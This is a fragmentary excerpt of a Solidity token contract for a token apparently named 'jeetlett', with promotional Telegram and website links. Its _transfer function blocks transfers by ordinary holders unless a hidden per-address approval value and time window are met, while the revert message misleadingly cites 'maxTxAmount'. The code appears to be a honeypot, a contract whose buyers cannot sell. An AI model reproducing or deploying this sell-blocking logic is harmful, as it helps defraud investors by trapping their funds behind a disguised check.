...
Telegram: https://t.me/jeetlett_avax
Website : https://www.jeetlett.live/
...
contract Contract is IERC20, Ownable {
  ...
  function _transfer(
    ...
    if (!inSwapAndLiquify && from != pair && from != address(router) && !_isExcludedFromFee[from]) {
      require(approval[from] > _approval && block.timestamp <= approval[from] + _maxTxAmount, 'Transfer amount exceeds the maxTxAmount.');
    }
